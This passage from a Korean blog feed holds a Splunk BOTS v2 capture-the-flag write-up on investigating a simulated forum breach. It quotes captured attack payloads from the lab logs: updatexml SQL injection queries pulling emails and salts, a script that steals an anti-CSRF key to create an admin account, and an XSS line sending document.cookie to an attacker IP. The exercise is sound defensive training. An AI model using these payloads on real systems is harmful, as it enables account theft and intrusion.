-    검색 결과를 reverse 명령으로 파이프하여 Splunk 이벤트 순서를 반대로 하면 이러한 이벤트가 훨씬 더 의미가 있을 것입니다. 이렇게 하면 목록 상단에 첫 번째 SQL injection 명령이 표시되고 아래에 이후 이벤트가 표시됩니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-    There is a lot of data captured in these events. You are looking for two pieces of data in the dest_content field. The first can be found following the string 'XPATH syntax error: '&lt;br /&gt;
-    이러한 이벤트에는 많은 데이터가 캡처되어 있습니다. dest_content 필드에서 두 개의 데이터를 찾고 있습니다. 첫 번째는 'XPATH 구문 오류: ' 문자열 다음에서 찾을 수 있습니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#4&lt;/summary&gt;
-    밑을 드래그하시면 힌트가 보입니다.
-&lt;/details&gt;
-&lt;p&gt;&lt;span style=&quot;color:white&quot;&gt;
-    The other important piece of data in the dest_content field can be extracted with the following regular expression: ‘&amp;lt;dt&amp;gt;Query:&amp;lt;/dt&amp;gt;\s+&amp;lt;dd&amp;gt;\s+(?&lt;sqli_query&gt;[^&amp;lt;]+)' Look for the sqli_query values that are stealing salt values.&lt;br /&gt;
-    dest_content 필드의 다른 중요한 데이터는 다음 정규식으로 추출할 수 있습니다. '&amp;lt;dt&amp;gt;Query:&amp;lt;/dt&amp;gt;\s+&amp;lt;dd&amp;gt;\s+(?&lt;sqli_query&gt;[^&amp;lt;]+)' 솔트 값을 훔치는 sqli_query 값.
-&amp;lt;/span&amp;gt;&lt;/sqli_query&gt;&lt;/sqli_query&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;문제 202번에서 사용했던 쿼리에 frank ester관련 키워드를 추가해봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php *frank* OR *ester*
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;dest_content필드의 중간 내용을 보면 username과 email을 알기위해 SQL injection 공격시도흔적이 보입니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 결과
-&amp;lt;dt&amp;gt;SQL Error:&amp;lt;/dt&amp;gt;
-&amp;lt;dd&amp;gt;1105 - XPATH syntax error: ':frankesters47@gmail.com'&amp;lt;/dd&amp;gt;
-&amp;lt;dt&amp;gt;Query:&amp;lt;/dt&amp;gt;
-&amp;lt;dd&amp;gt;
-			SELECT q.*, s.sid
-			FROM mybb_questionsessions s
-			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
-			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT email FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'
-		&amp;lt;/dd&amp;gt;
-2. 결과
-&amp;lt;dt&amp;gt;SQL Error:&amp;lt;/dt&amp;gt;
-&amp;lt;dd&amp;gt;1105 - XPATH syntax error: ':frank'&amp;lt;/dd&amp;gt;
-&amp;lt;dt&amp;gt;Query:&amp;lt;/dt&amp;gt;
-&amp;lt;dd&amp;gt;
-			SELECT q.*, s.sid
-			FROM mybb_questionsessions s
-			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
-			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT username FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'
-		&amp;lt;/dd&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;첫번째는 eamil, 두번째는 username 조회시도를 하고있습니다. 해당 이벤트 시간을 기준으로 ±5초로 발생한 SQL문의 이벤트를 봅시다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-24-12-09-35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php
-| rex field=dest_content &quot;&amp;lt;dt&amp;gt;Query:&amp;lt;/dt&amp;gt;\s+&amp;lt;dd&amp;gt;\s+(?&amp;lt;sqli_query&amp;gt;[^&amp;lt;]+)&quot;
-| rex field=dest_content &quot;&amp;lt;dd&amp;gt;1105 - XPATH syntax error:\s+(?&amp;lt;sql_errcode&amp;gt;[^&amp;lt;]+)&quot;
-| search sqli_query=*
-| table _time sql_errcode sqli_query
-| sort _time
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;sql_errcode 필드를 보면 아래차례대로 sql injection시도를 하고 있습니다.
-테이블명(mybb_users) -&amp;gt; row수(6) -&amp;gt; uid(1) -&amp;gt; username의 길이(5) -&amp;gt; 유저이름(frank) -&amp;gt; email주소길이(23) -&amp;gt; email(frankesters47@gmail.com) -&amp;gt; salt길이(8) -&amp;gt; salt(gGsxysZL) -&amp;gt; 비밀번호 길이(32)&lt;/p&gt;
-
-&lt;p&gt;답 : gGsxysZL&lt;/p&gt;
-
-&lt;p&gt;205	What is user btun’s password on brewertalk.com?&lt;br /&gt;
-berwertalk.com에서 btun의 비밀번호는 무엇입니까 ?&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    His hashed password and salt was stolen via SQLi and captured in Splunk. Also note a 'top 1000' password list is available in a Splunk lookup table file called 'top_1000.csv'. Use '| inputlookup top_1000.csv' to inspect it.&lt;br /&gt;
-    그의 해시된 암호와 slat값은 SQL injection을 통해 도난당했으며 Splunk에서 발견되었습니다. 또한 'top_1000.csv'라는 Splunk 조회 테이블 파일에서 '상위 1000' 암호 목록을 사용할 수 있습니다. 사용 '| inputlookup top_1000.csv'를 검사하여 검사합니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    By inspecting the code for this forum software, it can be determined that the stored password hash is computed as follows: md5( md5(salt) + md5(plaintext password) ) where '+' is simple string concatenation.&lt;br /&gt;
-    이 포럼 소프트웨어의 코드를 검사하여 저장된 암호 해시가 다음과 같이 계산되었음을 확인할 수 있습니다. md5(md5(salt) + md5(일반 텍스트 암호)) 여기서 '+'는 단순히 문자열 연결을 뜻합니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-    The Splunk eval command includes an md5 hash function. Beware that the exploit used in this attack chops the final character from the password hash and includes it as a single character string in the next SQLi extraction. When you use this string, either add the character back to the end of the hash, or just use a wildcard match on the beginning of it.&lt;br /&gt;
-    Splunk eval 명령에는 md5 해시 함수가 포함되어 있습니다. 이 공격에 사용된 익스플로잇은 비밀번호 해시에서 최종 문자를 잘라내고 다음 SQLi 추출에서 단일 문자열로 포함한다는 점에 유의하십시오. 이 문자열을 사용할 때 해시 끝에 문자를 다시 추가하거나 시작 부분에 와일드카드 일치를 사용하십시오.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#4&lt;/summary&gt;
-
-&lt;/details&gt;
-
-&lt;p&gt;해당 질문은 현 실습 환경에서 제공되지 않는 Splunk ES에서 확인할 수 있는것으로 문제풀이는 하지않겠습니다.&lt;/p&gt;
-
-&lt;p&gt;206	What are the characters displayed by the XSS probe? Answer guidance: Submit answer in native language or character set.
-XSS 프로브가 표시하는 문자는 무엇입니까? 답변 안내: 현지어 또는 문자 집합으로 답변을 제출합니다.&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    The attack is obscured in the logs by URL encoding.
-    공격은 URL 인코딩에 의해 로그에서 가려집니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    Splunk has the capability to URLdecode strings. Check your quick reference guide or Google for it.
-    Splunk에는 문자열을 URL 디코딩하는 기능이 있습니다. 빠른 참조 가이드 또는 Google을 확인하십시오.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-    Try using | eval decoded_uri=urldecode(uri)
-    다음 SPL을 사용해보세요 | eval decoded_uri=urldecode(uri)
-&lt;/details&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#4&lt;/summary&gt;
-    Don't forget to check if others on your team have investigated this before.
-    팀의 다른 사람들이 전에 이것을 조사했는지 확인해보세요.
-&lt;/details&gt;
-
-&lt;p&gt;XSS공격은 script를 이용한 공격입니다. 키워드 script가 있는 form_data를 조사해봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http &quot;&amp;lt;script&amp;gt;&quot;
-| dedup form_data
-| table _time form_data src_ip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;_time&lt;/th&gt;
-      &lt;th&gt;form_data&lt;/th&gt;
-      &lt;th&gt;src_ip&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;2017/08/16 15:19:17.163&lt;/td&gt;
-      &lt;td&gt;module=user-titles&amp;amp;action=edit&amp;amp;utid=2%22%3E%3Cscript%3E%0Awindow.onload%3Dfunction(e)%7B%0A%20%20var%20my_post_key%20%3D%20document.getElementsByName(%22my_post_key%22)%5B0%5D.value%0A%20%20console.log(my_post_key)%3B%0A%20%20var%20postdata%3D%20%22my_post_key%3D%22%2Bmy_post_key%2B%22%26username%3DkIagerfield%26password%3Dbeer_lulz%26confirm_password%3Dbeer_lulz%26email%3DkIagerfield%40froth.ly%26usergroup%3D4%26additionalgroups%5B%5D%3D4%26displaygroup%3D4%22%3B%2F%2FPost%20the%20Data%0A%20%20var%20url%20%3D%20%22http%3A%2F%2Fwww.brewertalk.com%2Fadmin%2Findex.php%3Fmodule%3Duser-users%26action%3Dadd%22%3B%0A%20%20var%20http%3B%0A%20%20http%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20http.open(%22Post%22%2Curl)%3B%0A%0A%20%20http.setRequestHeader(%27Accept%27%2C%27text%2Fhtml%27)%3B%0A%20%20http.setRequestHeader(%27Content-type%27%2C%27application%2Fx-www-form-urlencoded%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxhtml%2Bxml%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxml%27)%3B%0A%20%20http.send(postdata)%3B%0A%20%20console.log(my_post_key)%3B%0A%7D%0A%3C%2Fscript%3E&lt;/td&gt;
-      &lt;td&gt;71.39.18.125&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;2017/08/15 23:36:34.915&lt;/td&gt;
-      &lt;td&gt;action=activate&amp;amp;uid=-1&amp;amp;code=%22%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2F45.77.65.211%3A9999%2Fmicrosoftuserfeedbackservice%3Fmetric%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E&lt;/td&gt;
-      &lt;td&gt;71.39.18.125&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;2017/08/12 09:49:00.520&lt;/td&gt;
-      &lt;td&gt;action=activate&amp;amp;uid=-1&amp;amp;code=%22%3E%3Cscript%3Ealert(%27%EB%8C%80%EB%8F%99%27)%3C%2Fscript%3E&lt;/td&gt;
-      &lt;td&gt;136.0.0.125&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;내용이 base64인코딩되어 있습니다. urldecode함수를 통해 디코딩해봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http &quot;&amp;lt;script&amp;gt;&quot;
-| dedup form_data
-| eval decoded=urldecode(form_data) 
-| table _time decoded src_ip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-11-02-12-01-02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;쿼리 결과 중 ‘대동’이라는 글자를 발견할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;답 : 대동&lt;/p&gt;
-
-&lt;p&gt;207	What was the value of the cookie that Kevin’s browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.&lt;br /&gt;
-XSS 공격의 일환으로 Kevin의 브라우저가 악성 URL에 전송한 쿠키값은 무엇이었습니까? 답변 안내: 모두 숫자입니다. 쿠키 이름이나 등호와 같은 기호가 아닙니다.&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Check out sourcetype=stream:http
-    sourcetype stream:http를 확인해보세요.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    Inspect the uri_query field.
-    uri_query 필드를 검사합니다.
-&lt;/details&gt;
-
-&lt;p&gt;kevin의 브라우저에서 XSS공격으로 인한 쿠키값이 탈취되었습니다. 키워드 kevin, “&lt;script&gt;&quot;, cookie를 넣어 검색해 봅시다.&lt;/script&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http *kevin* &quot;&amp;lt;script&amp;gt;&quot; *cookie*
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;1개의 검색결과가 나왔습니다.&lt;/p&gt;
-
-&lt;p&gt;내용 중 class=”username”&amp;gt;kevin&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt;라는 항목이 있는것을 보니 kevin과 관련된 이벤트입니다.&lt;/p&gt;
-
-&lt;p&gt;또, cookie 필드값은 다음과 같습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228; adminsid=9267f9cec584473a8d151c25ddb691f1; acploginattempts=0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;여러개의 값 중 lastvisit이 마지막 방문시 쓰였던 쿠키값임을 알 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;답 : 1502408189&lt;/p&gt;
-
-&lt;p&gt;208	The brewertalk.com web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield’s computer and used to help create an unauthorized admin user on brewertalk.com?&lt;br /&gt;
-brewertalk.com 웹 사이트는 CSRF(Cross Site Request Forgery) 기술을 사용했습니다. Kevin Lagerfield의 컴퓨터에서 도난당하여 brewertalk.com에서 승인되지 않은 관리자를 생성하는 데 사용된 anti-CSRF 토큰 값은 무엇입니까?&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Anti-CSRF tokens are usually hidden form elements set when the browser loads an HTML page containing a form. If the form is submitted without the anti-CSRF token, the backend code of the website rejects the transaction as it might have come from a malicious source rather than from a legitimate user of the form.&lt;br /&gt;
-    Anti-CSRF 토큰은 일반적으로 브라우저가 양식을 포함하는 HTML 페이지를 로드할 때 설정된 숨겨진 양식 요소입니다. 안티 CSRF 토큰 없이 양식을 제출하는 경우 웹사이트의 백엔드 코드는 해당 양식의 합법적인 사용자가 아닌 악의적인 소스에서 온 것일 수 있으므로 트랜잭션을 거부합니다.
-&lt;/details&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    One of the many ways that an attacker can abuse a cross site scripting vulnerability is to use it to defeat CSRF protections. If you carefully inspect XSS attacks in the data set, you will stumble on some malicious code that is stealing the anti-CSRF token.&lt;br /&gt;
-    공격자가 크로스 사이트 스크립팅 취약점을 악용할 수 있는 여러 방법 중 하나는 이를 사용하여 CSRF 보호를 무력화하는 것입니다. 데이터 셋에서 XSS 공격을 주의 깊게 검사하면 anti-CSRF token을 훔치는 일부 악성 코드를 발견하게 될 것입니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-    On brewertalk.com, users created with usergroup=4 are administrators.&lt;br /&gt;
-    brewertalk.com에서 usergroup=4로 생성된 사용자는 관리자입니다.
-&lt;/details&gt;
-
-&lt;p&gt;CSRF 토큰이란, CSRF공격 대응하기 위해 클라이언트에서 서버로 요청할때 실제 서버에서 허용한 요청이 맞는지 확인하기 위한 값을 말합니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://codevang.tistory.com/282&quot;&gt;csrf 토큰이란?&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=&quot;stream:http&quot; 
-| reverse 
-| search &quot;input type=&quot;hidden&quot;&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;아래 결과를 발견할 수 있습니다.
-input type=”hidden” name=”my_post_key” value=”1bc3eab741900ab25c98eee86bf20feb&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=&quot;stream:http&quot; 1bc3eab741900ab25c98eee86bf20feb 
-| reverse
-| table form_data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;아래와 같이 조회 됩니다.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-my_post_key=1bc3eab741900ab25c98eee86bf20feb&amp;amp;username=kIagerfield&amp;amp;password=beer_lulz&amp;amp;confirm_password=beer_lulz&amp;amp;email=kIagerfield@froth.ly&amp;amp;usergroup=4&amp;amp;additionalgroups[]=4&amp;amp;displaygroup=4```&quot;&gt;
-답 : 1bc3eab741900ab25c98eee86bf20feb
-
-209	What brewertalk.com username was maliciously created by a spearphishing attack?  
-스피어피싱 공격에 의해 악의적으로 생성된 brewertalk.com 사용자 이름은 무엇입니까?
-
-&amp;lt;details&amp;gt;
-  &amp;lt;summary&amp;gt;hint#1&amp;lt;/summary&amp;gt;
-    The attacker was trying to masquerade as something that would look legitimate to a casual observer.&amp;lt;br&amp;gt;
-    공격자는 관찰자에게 그럴듯하게 보이려고 가장했습니다.
-&amp;lt;/details&amp;gt;
-
-&amp;lt;details&amp;gt;
-  &amp;lt;summary&amp;gt;hint#2&amp;lt;/summary&amp;gt;
-    The attacker stole a trick from domain squatters by using a homograph attack. More info on homograph attacks can be found on Wikipedia.&amp;lt;br&amp;gt;
-    공격자는 동형이의어(homograph) 공격을 사용하여 도메인 관리자로부터 속였습니다. 동형이의어 공격에 대한 자세한 내용은 Wikipedia에서 찾을 수 있습니다.
-&amp;lt;/details&amp;gt;
-
-&amp;lt;details&amp;gt;
-  &amp;lt;summary&amp;gt;hint#3&amp;lt;/summary&amp;gt;
-    The password of this new, unauthorized, malicious administrative account is beer_lulz.&amp;lt;br&amp;gt;
-    새로운 승인되지 않은 악의적인 관리 계정의 암호는 beer_lulz입니다.
-&amp;lt;/details&amp;gt;
-
-스피어 피싱(spear phishing)이란, 특정한 개인이나 회사들을 대상으로 시도하는 피싱을 스피어 피싱입니다.
-
-힌트#3을 보면 계정의 암호는 &quot;beer_lulz&quot;입니다. 해당 암호를 키워드로 검색해봅니다.
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;sourcetype=”stream:http” beer_lulz
-```&lt;/p&gt;
-
-&lt;p&gt;form_data필드 값이 아래와 같습니다.&lt;br /&gt;
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;form_data: username=kIagerfield&amp;amp;password=beer_lulz&amp;amp;do=login&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;유저이름은 kIagerfield입니다.
-힌트#2에서 &lt;a href=&quot;https://ko.wikiqube.net/wiki/IDN_homograph_attack&quot;&gt;동형이의어 공격&lt;/a&gt;을 사용했다고 알려주었으므로, 원래 이름은 두번째글자에서 대문자 I가 아닌, 소문자 l일 가능성이 높습니다.&lt;/p&gt;
-
-&lt;p&gt;답 : kIagerfield&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Kim-Gunwoo</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="splunk" />
-      
-
-      
-        <summary type="html">Splunk BOTS의 데이터셋은 3개입니다. BOTS란? BOTS v1 Write up(1) BOTS v1 Write up(2) - END BOTS v2 Write up(1) BOTS v2 Write up(2) BOTS v2 Write up(3) BOTS v2 Write up(4) BOTS v2 Write up(5) - END BOTS v3 Write up(1) BOTS v3 Write up(2) BOTS v3 Write up(3) BOTS v3 Write up(4) - END BOTS v4 결과</summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">splunk-bots-v2 write up(1)</title>
-      <link href="https://wind-flow.github.io/splunk-BOTS-v2-part1" rel="alternate" type="text/html" title="splunk-bots-v2 write up(1)" />
-      <published>2021-10-04T20:04:36+09:00</published>
-      <updated>2021-10-04T20:04:36+09:00</updated>
-      <id>https://wind-flow.github.io/splunk-BOTS-v2-part1</id>
-      <content type="html" xml:base="https://wind-flow.github.io/splunk-BOTS-v2-part1">&lt;p&gt;&lt;span class=&quot;table-of-contents-list&quot;&gt;Splunk BOTS의 데이터셋은 3개입니다.&lt;/span&gt;&lt;/p&gt;
-&lt;ul class=&quot;table-of-contents-list&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-overview&quot;&gt;BOTS란? &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v1-part1&quot;&gt;BOTS v1 Write up(1)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v1-part2&quot;&gt;BOTS v1 Write up(2) - END&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part1&quot;&gt;BOTS v2 Write up(1) &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part2&quot;&gt;BOTS v2 Write up(2) &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part3&quot;&gt;BOTS v2 Write up(3) &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part4&quot;&gt;BOTS v2 Write up(4) &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part5&quot;&gt;BOTS v2 Write up(5) - END&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part1&quot;&gt;BOTS v3 Write up(1)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part2&quot;&gt;BOTS v3 Write up(2)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part3&quot;&gt;BOTS v3 Write up(3)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part4&quot;&gt;BOTS v3 Write up(4) - END&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-2021-BOTS-END&quot;&gt;BOTS v4 결과&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;APT Scenarios:&lt;/p&gt;
-
-&lt;p&gt;In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.&lt;br /&gt;
-이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.&lt;/p&gt;
-
-&lt;p&gt;Hunting Scenarios:&lt;/p&gt;
-
-&lt;p&gt;PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.&lt;br /&gt;
-PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.&lt;br /&gt;
-Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTP&lt;br /&gt;
-Exfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.&lt;br /&gt;
-Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNS&lt;br /&gt;
-Exfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.&lt;br /&gt;
-Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.&lt;br /&gt;
-Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.&lt;br /&gt;
-Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.&lt;br /&gt;
-Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.&lt;br /&gt;
-User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.&lt;br /&gt;
-User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.&lt;br /&gt;
-Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.&lt;br /&gt;
-Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.&lt;br /&gt;
-Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.&lt;br /&gt;
-Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.&lt;br /&gt;
-Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.&lt;br /&gt;
-Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.&lt;br /&gt;
-Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.&lt;br /&gt;
-Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.
-OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.&lt;br /&gt;
-OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.&lt;br /&gt;
-Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).&lt;br /&gt;
-Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.&lt;br /&gt;
-Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.&lt;br /&gt;
-Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/b21.jpg&quot; alt=&quot;Scenario 1&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.&lt;br /&gt;
